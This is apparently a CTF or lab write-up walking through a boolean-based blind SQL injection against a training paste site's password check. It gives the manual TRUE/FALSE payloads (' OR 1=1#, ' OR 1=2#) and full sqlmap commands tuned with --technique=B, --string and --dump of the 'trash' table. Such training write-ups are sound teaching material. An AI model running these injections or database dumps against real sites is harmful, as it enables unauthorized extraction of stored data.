## sql_6 - BOOLEAN BASED BLIND
- This time things are a little different, the UUID parameter is no longer vulnerable and if we try to mess with it we will get a helpful tip to blind inject on password protection.
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528356086663_Screenshot+2018-06-07+00.20.41.png)

- To get started on that we create a new paste with a password of ‘test’.
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528358491496_Screenshot+2018-06-07+00.51.48.png)

- I don’t know about you but ain’t nobody got time for manual blind injection, so we fire up SQLmap. Our initial basic attempt might look something like this:
  - We’re using the page url from the example, max level/risk and supplying dbms

`sqlmap -u http://<host>/page/18fe3270-6a24-11e8-abd0-420030282801?p=test --level=5 --risk=3 --dbms=mysql`

- Run it and tell it to continue with default options if any prompts appear to find this out,
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528356691952_Screenshot+2018-06-07+00.30.46.png)

- So good news, it’s injectable but bad news is sqlmap wants to try time-based. This will both slow down server when multiple people are doing this, and will also just take a really long time.
- Instead we can add `--technique=B` to tell sqlmap that it’s a boolean-based blind. We can know this from manually testing and inspecting the resulting page as shown below.
- Injected with TRUE query `'` `OR 1=1#`
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528357965303_Screenshot+2018-06-07+00.52.16.png)

- Injected with FALSE query `'` `OR 1=2#`
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528357997889_Screenshot+2018-06-07+00.52.26.png)

- SQLmap can struggle to find these differences so it may not detect it for you. Instead we can supply this discovery to improve our command line:
  - Adding `--``string` here tells sqlmap the query result was TRUE if it sees it.

`sqlmap -u http://127.0.0.1:4141/page/18fe3270-6a24-11e8-abd0-420030282801?p=test --level=5 --risk=3 --dbms=mysql --technique=B --string="Password Check Failed"`

- That change immediately yields the vulnerability we want it to exploit,
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528358115973_Screenshot+2018-06-07+00.54.45.png)

- Now we simply add `--dump -T trash` and sqlmap will do the rest of the hardwork for us.
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528358226828_Screenshot+2018-06-07+00.56.57.png)

NOTE: dbms will be sqlite if you are testing locally
NOTE: Make sure the page you put in the SQLmap command corresponds to a legitimate page on the website
